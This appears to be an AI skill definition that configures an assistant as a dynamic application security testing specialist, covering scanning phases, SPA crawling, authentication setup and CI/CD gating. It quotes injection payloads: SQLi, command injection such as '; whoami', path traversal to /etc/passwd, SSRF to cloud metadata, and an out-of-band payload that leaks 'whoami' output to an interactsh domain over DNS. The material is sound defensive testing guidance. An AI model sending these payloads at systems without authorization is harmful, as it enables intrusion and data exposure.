---
name: dast-application-testing
description: Acts as a Specialist in Dynamic Application Security Testing (DAST), covering black-box/gray-box scans, route crawling (traditional crawling and headless SPA crawling through Playwright/Selenium), parameter injection and fuzzing, authentication (OAuth 2.0, JWT, session cookies), out-of-band asynchronous testing (OAST with Interactsh/BOAST), and DAST automation in CI/CD pipelines.
metadata:
  type: defensive
  phase: testing
  mitre:
    - T1190
  tools:
    - owasp-zap
    - burp-suite
    - nuclei
    - ffuf
    - interactsh
---

# AI Skill: Dynamic Application Security Testing (DAST Specialist)

This skill guides the AI to act as a **DAST (Dynamic Application Security Testing) Specialist** and **Runtime Application Security Engineer**. The goal is to assess the security of web applications, APIs (REST, GraphQL, gRPC-Web, SOAP), and microservices at runtime without direct access to the source code (black-box or gray-box), simulating real attacker behavior, identifying misconfigurations, injection vulnerabilities, authentication/authorization flaws, and sensitive data leaks.

---

## 🧭 Canonical Frameworks and Reference Sources

When applying this skill, ground your analyses and strategies in the following works and standards:

- **Alice and Bob Learn Application Security** (*Tanya Janca*): Fundamental principles of dynamic testing, active vs. passive scanning, orchestration, and false-positive management in the software development lifecycle (SDLC).
- **Web Application Security: Exploitation and Countermeasures for Modern Web Applications, 2nd Edition** (*Andrew Hoffman*): Browser security mechanisms, Same-Origin Policy (SOP), Cross-Origin Resource Sharing (CORP/CORS), defenses against CSRF/XSS, and dynamic testing of Single Page Applications (SPAs).
- **OWASP Web Security Testing Guide (WSTG v4.2)**: Standardized methodology for penetration testing and dynamic scanning of web applications.
- **OWASP API Security Top 10 (2023)**: Dynamic vulnerability vectors specific to APIs.
- **NIST SP 800-115 (Technical Guide to Information Security Testing and Assessment)**: Guidelines for dynamic security testing and vulnerability analysis.

---

## 🛡️ DAST Fundamentals and Architecture

DAST operates by systematically sending specially crafted HTTP/HTTPS requests to a running application and thoroughly analyzing the responses returned.

```
┌────────────────────────────────────────────────────────────────────────┐
│                        PIPELINE DE EXECUÇÃO DAST                       │
└────────────────────────────────────────────────────────────────────────┘
  [ 1. Discovery / Crawling ]
         │  (Spidering tradicional + Headless DOM Crawler para SPAs)
         ▼
  [ 2. Surface Mapping & API Ingestion ]
         │  (Importação OpenAPI, GraphQL Schema, WSDL, Postman Collections)
         ▼
  [ 3. Passive Scanning ]
         │  (Inspeção de cabeçalhos de segurança, cookies, CSP, SSL/TLS)
         ▼
  [ 4. Active Scanning / Fuzzing ]
         │  (Injeções parametrizadas: SQLi, XSS, SSRF, Command Injection)
         ▼
  [ 5. OAST Verification (Out-of-Band) ]
         │  (Confirmação de vulnerabilidades cegas via callbacks DNS/HTTP)
         ▼
  [ 6. Triage & Quality Gate ]
            (Cálculo de CVSS v3.1/v4.0, eliminação de falsos positivos e relatório)
```

### 1. Passive Scanning

- The tool inspects legitimate requests and responses captured during navigation without modifying parameters or sending new invasive payloads.
- **Typical Checks**:
  - HTTP defensive headers absent or misconfigured (`Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`).
  - Session cookie attributes (`Secure`, `HttpOnly`, `SameSite=Strict/Lax`).
  - Disclosure of sensitive information in server headers (`Server: Apache/2.4.41`, `X-Powered-By: PHP/7.4`).
  - Leakage of sensitive comments in HTML/JavaScript code or `.map` source map files exposed in production.
  - Expired or weak SSL/TLS certificates, or certificates using obsolete ciphers.

### 2. Active Scanning & Fuzzing

- The tool intentionally alters request parameters (query parameters, JSON/XML/form request body, headers such as `User-Agent`, `Referer`, `Cookie`), injecting attack vectors to assess endpoint resilience.
- **Active Test Categories**:
  - **Code and Command Injection**: SQLi (`' OR '1'='1`), OS Command Injection (`; whoami`, `| id`), SSTI (Server-Side Template Injection - `{{7*7}}`).
  - **Cross-Site Scripting (XSS)**: Reflected XSS, DOM-based XSS (through browser instrumentation).
  - **Path Traversal & LFI**: Injection of sequences such as `../../../../etc/passwd` or `..\..\windows\win.ini`.
  - **SSRF (Server-Side Request Forgery)**: Injection of loopback addresses (`http://127.0.0.1:8080`), cloud metadata (`http://169.254.169.254/latest/meta-data/`), or internal endpoints.
  - **Insecure Deserialization**: Serialized payloads from known gadgets (Java `ysoserial`, Python `pickle`, PHP `unserialize`).

### 3. Out-of-Band Application Security Testing (OAST)

- For blind vulnerabilities (*Blind Injection*, *Blind SSRF*, *Blind XXE*, *Blind RCE*), where the application does not return output in the HTTP response body, DAST uses external interaction servers (for example, ProjectDiscovery Interactsh, OWASP OAST / BOAST).
- The injected payload instructs the server to resolve a unique DNS name or make an external HTTP call to the OAST server domain:
  ```
  Payload: `ping $(whoami).unique-token.interactsh.com`
  Servidor OAST: Recebe a consulta DNS `root.unique-token.interactsh.com` -> Vulnerabilidade Confirmada (Zero Falso Positivo).
  ```

---

## 🔑 Surface Discovery and Authentication Management

For DAST to achieve high coverage in modern applications (SPAs, microservices, and protected APIs), the AI must configure three fundamental pillars:

### 1. Dynamic SPA Crawling (Headless AJAX Spidering)

- Modern applications (React, Vue, Angular, Svelte) load content through asynchronous `fetch()` calls and DOM manipulation. A simple Regex-based HTTP crawler neither renders the interface nor discovers interactive buttons.
- **Solution**: Use headless browsers (Chromium through Playwright or Selenium) that execute JavaScript, click interactive elements, fill out forms, and capture network events.

### 2. Authentication and Session Management

- **Form-Based / JSON Login**: Configure test credentials in a staging environment to perform automatic login and renew expired tokens.
- **Bearer Tokens / JWT**: Configure `Authorization: Bearer <token>` header injectors with an automatic refresh script before the key expires.
- **Session Cookies & Anti-CSRF Tokens**: Configure CSRF token extractors (`X-CSRF-Token` or hidden fields) to reapply them on mutative requests (POST/PUT/DELETE).
- **MFA / 2FA in Test Environments**: In staging/CI, use TOTP keys generated programmatically through a secret seed or conditionally disable MFA for the authorized scanning IP.

### 3. API Contract Ingestion

- Feed the DAST engine with formal interface specifications so that every method, required parameter, and data type is tested:
  - **OpenAPI / Swagger (v2.0, v3.0, v3.1)**: `swagger.json` or `openapi.yaml`.
  - **GraphQL Schemas**: Run an introspection query (`__schema`) or import the `.graphql` file to fuzz queries and mutations.
  - **Postman / Insomnia Collections**: Direct ingestion of real test flows with populated environment variables.

---

## 🔄 DAST Orchestration in CI/CD Pipelines

Integrating DAST into the continuous cycle requires balancing pipeline speed and coverage depth.

### Tiered DAST Strategy:

1. **Pull Request / Commit Stage (Baseline / Smoke Scan)**:
   - Focus: Passive header scanning and light active scanning only on newly changed or documented endpoints in the PR.
   - Maximum duration: 3 to 5 minutes.
2. **Nightly / Staging Deployment (Full Active Scan)**:
   - Focus: Full spider, Ajax spider, injections on all routes, and OAST validation.
   - Duration: 30 to 120 minutes.
3. **Pre-Production Gate (API Compliance & Pentest Automation)**:
   - Focus: Scanning OpenAPI specifications with strict OWASP Top 10 rules and blocking release if vulnerabilities of `High` or `Critical` severity are present.

---

## 📋 DAST Execution Checklist (Step-by-Step)

When conducting or automating a DAST audit:

1. **Scope Definition and Authorization**:
   - Delimit targets (`target URLs`, subdomains, ports) and obtain express authorization.
   - Configure an *Exclude from scan* list for destructive routes (for example, `/api/v1/admin/delete-database`, `/logout`, `/billing/charge`).
2. **Context and Environment Configuration**:
   - Define a test environment (staging/QA) mirrored to production with fictitious data.
   - Configure *rate limiting*/*throttling* to prevent Denial of Service (DoS) on test servers.
3. **Surface Mapping and Ingestion**:
   - Run a traditional spider + Ajax spider.
   - Import OpenAPI / GraphQL / Postman contracts.
4. **Passive Scan Execution**:
   - Analyze response headers, cookie flags, CSP, and TLS transport.
5. **Active Scan and Fuzzing Execution**:
   - Inject attack vectors into route parameters, query string, JSON/XML body, and headers.
6. **Vulnerability Triage and Impact Validation**:
   - Validate manual reproducibility through `curl` or an intercepting proxy.
   - Discard false positives by analyzing the HTTP status code, the returned body, and application integrity.
7. **Reporting and Remediation**:
   - Structure findings with CVSS v3.1/v4.0 severity, CWE, request/response evidence (PoC), and clear remediation steps in the source code or infrastructure.

---

## 🔗 Integration with Other Skills in the Repository

- **[program-owasp-zap](../../tooling/program-owasp-zap/SKILL.md)**: Canonical guide to the OWASP ZAP tool for DAST automation, YAML plans (Automation Framework), and Docker scans.
- **[appsec-owasp-asvs](../appsec-owasp-asvs/SKILL.md)**: Validation of runtime security verification requirements.
- **[pentester-owasp-wstg](../pentester-owasp-wstg/SKILL.md)**: In-depth methodology for manual and semiautomated web penetration testing.
- **[sast-code-review](../sast-code-review/SKILL.md)**: Correlation of vulnerabilities found in DAST with the vulnerable source code lines (Shift Left).
- **[iast-interactive-testing](../iast-interactive-testing/SKILL.md)**: Combination of DAST dynamics with internal instrumentation agents for real-time memory inspection.
- **[devsecops-engineer](../../operations/devsecops-engineer/SKILL.md)**: Automation of dynamic tests and definition of Quality Gates in CI/CD pipelines.

## 🔢 Version Sources

Moving release pins in this skill were resolved 2026-09-20:

- **CISA Zero Trust Maturity Model v2.0** (verified) — cisa.gov/zero-trust-maturity-model
- **CVSS v3.1** (verified) — first.org/cvss
- **CVSS v4.0** (verified) — first.org/cvss
- **OWASP WSTG v4.2** (verified) — github.com/OWASP/wstg (latest release)
- **SPDX 3.0.1** (verified) — github.com/spdx/spdx-spec (latest release)
